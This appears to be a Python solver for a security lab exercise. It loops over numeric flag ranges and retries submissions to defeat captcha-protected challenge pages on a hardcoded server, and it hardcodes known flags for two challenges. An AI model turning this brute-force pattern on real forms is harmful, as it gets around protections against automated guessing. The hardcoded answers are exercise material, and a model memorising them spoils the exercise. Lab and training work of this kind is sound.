import os
import re
import time

from src.tp3.utils.config import logger
from src.tp3.utils.session import Session
from src.tp3.main import *  # noqa: F401,F403

DEFAULT_BASE_URL = "http://31.220.95.27:9002"
DEFAULT_CHALLENGES = "1,2,3,4,5"
DEFAULT_FLAG_START = 1000
DEFAULT_FLAG_END = 2000
DEFAULT_RETRIES_PER_FLAG = 3

CHALLENGE_FLAG_RANGES = {
    "1": (1000, 2000),
    "2": (2000, 3000),
    "3": (3000, 4000),
}

CHALLENGE_FIXED_FLAGS = {
    "4": 7629,
    "5": 8632,
}


def build_challenge_urls(
    base_url: str = DEFAULT_BASE_URL,
    challenge_ids: str = DEFAULT_CHALLENGES,
) -> dict[str, str]:
    root = base_url.rstrip("/")
    return {
        challenge_id: f"{root}/captcha{challenge_id}/"
        for challenge_id in _split_challenge_list(challenge_ids)
    }


def solve_challenge(
    url: str,
    *,
    flag_start: int,
    flag_end: int,
    retries_per_flag: int,
    delay_seconds: float,
) -> str:
    total_attempts = (flag_end - flag_start + 1) * retries_per_flag
    attempt_number = 0
    session = Session(url)

    for flag_candidate in _candidate_flags(flag_start, flag_end):
        flag_found, attempt_number = _try_flag_candidate(
            session=session,
            url=url,
            flag_candidate=flag_candidate,
            retries_per_flag=retries_per_flag,
            delay_seconds=delay_seconds,
            first_attempt_number=attempt_number,
            total_attempts=total_attempts,
        )
        if flag_found:
            return flag_found

    raise RuntimeError(f"No flag found for {url} between {flag_start} and {flag_end}")


def _try_flag_candidate(
    *,
    session: Session,
    url: str,
    flag_candidate: int,
    retries_per_flag: int,
    delay_seconds: float,
    first_attempt_number: int,
    total_attempts: int,
) -> tuple[str, int]:
    attempt_number = first_attempt_number

    for captcha_try in range(1, retries_per_flag + 1):
        attempt_number += 1
        logger.info(
            "Try %s/%s | %s | flag=%s | captcha=%s/%s",
            attempt_number,
            total_attempts,
            url,
            flag_candidate,
            captcha_try,
            retries_per_flag,
        )

        session.flag_value = str(flag_candidate)
        session.prepare_request()
        session.submit_request()

        if session.process_response():
            return session.get_flag(), attempt_number

        if session.last_result == "wrong_flag":
            return "", attempt_number

        _sleep_if_requested(delay_seconds)

    return "", attempt_number


def _candidate_flags(start: int, end: int):
    return range(start, end + 1)


def _sleep_if_requested(delay_seconds: float) -> None:
    if delay_seconds > 0:
        time.sleep(delay_seconds)


def _split_challenge_list(challenge_ids: str) -> list[str]:
    normalized_ids = challenge_ids.replace(" ", "")
    return [item for item in normalized_ids.split(",") if item]


def _read_settings() -> dict[str, str | None]:
    return {
        "base_url": os.getenv("TP3_BASE_URL", DEFAULT_BASE_URL),
        "challenge_ids": os.getenv("TP3_CHALLENGES", DEFAULT_CHALLENGES),
        "flag_start": os.getenv("TP3_FLAG_START"),
        "flag_end": os.getenv("TP3_FLAG_END"),
        "magic_word": os.getenv("TP3_MAGIC_WORD", ""),
        "retries": os.getenv("TP3_RETRIES_PER_FLAG", str(DEFAULT_RETRIES_PER_FLAG)),
        "delay": os.getenv("TP3_DELAY_SECONDS", "0.2"),
    }


def _log_flag_selection(challenge_id: str, flag_start: int, flag_end: int) -> None:
    if is_fixed_flag_challenge(challenge_id) and flag_start == flag_end:
        logger.info("Challenge %s uses fixed flag %s", challenge_id, flag_start)
        return

    logger.info("Challenge %s scans flags %s..%s", challenge_id, flag_start, flag_end)


def _configure_magic_word(challenge_id: str, magic_word: str) -> None:
    if challenge_id in {"4", "5"} and magic_word:
        os.environ["TP3_MAGIC_WORD"] = magic_word
        logger.info("Magic-Word set for challenge %s", challenge_id)


def _run_one_challenge(
    *,
    challenge_id: str,
    url: str,
    flag_start: int,
    flag_end: int,
    retries_per_flag: int,
    delay_seconds: float,
) -> str:
    logger.info("Solving challenge %s at %s", challenge_id, url)
    _log_flag_selection(challenge_id, flag_start, flag_end)
    return solve_challenge(
        url,
        flag_start=flag_start,
        flag_end=flag_end,
        retries_per_flag=retries_per_flag,
        delay_seconds=delay_seconds,
    )


def get_flag_range(
    challenge_id: str,
    start_env: str | None,
    end_env: str | None,
) -> tuple[int, int]:
    if start_env is not None and end_env is not None:
        return int(start_env), int(end_env)

    if challenge_id in CHALLENGE_FIXED_FLAGS:
        exact_flag = CHALLENGE_FIXED_FLAGS[challenge_id]
        return exact_flag, exact_flag

    return CHALLENGE_FLAG_RANGES.get(
        challenge_id,
        (DEFAULT_FLAG_START, DEFAULT_FLAG_END),
    )


def is_fixed_flag_challenge(challenge_id: str) -> bool:
    return challenge_id in CHALLENGE_FIXED_FLAGS


def extract_flag_payload(flag_value: str) -> str:
    """Return the value found inside flag braces, or an empty string."""
    match = re.search(r"\{\s*([^}]+?)\s*\}", flag_value)
    return match.group(1).strip() if match else ""


def magic_word_for_challenge(
    challenge_id: str,
    flags: dict[str, str],
    current_magic_word: str,
) -> str:
    """Select the Magic-Word expected by header-only challenges."""
    if challenge_id == "4":
        return extract_flag_payload(flags.get("3", "")) or current_magic_word

    if challenge_id == "5":
        return extract_flag_payload(flags.get("4", "")) or current_magic_word

    return current_magic_word


def main() -> int:
    logger.info("TP3 run started")

    settings = _read_settings()
    retries_per_flag = int(settings["retries"] or DEFAULT_RETRIES_PER_FLAG)
    delay_seconds = float(settings["delay"] or "0.2")
    magic_word = str(settings["magic_word"] or "")
    flags: dict[str, str] = {}

    challenge_urls = build_challenge_urls(
        str(settings["base_url"]),
        str(settings["challenge_ids"]),
    )

    for challenge_id, url in challenge_urls.items():
        magic_word = magic_word_for_challenge(challenge_id, flags, magic_word)
        _configure_magic_word(challenge_id, magic_word)

        flag_start, flag_end = get_flag_range(
            challenge_id,
            settings["flag_start"],
            settings["flag_end"],
        )
        flags[challenge_id] = _run_one_challenge(
            challenge_id=challenge_id,
            url=url,
            flag_start=flag_start,
            flag_end=flag_end,
            retries_per_flag=retries_per_flag,
            delay_seconds=delay_seconds,
        )
        logger.info("Challenge %s returned %s", challenge_id, flags[challenge_id])

    logger.info("TP3 run completed: %s", flags)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
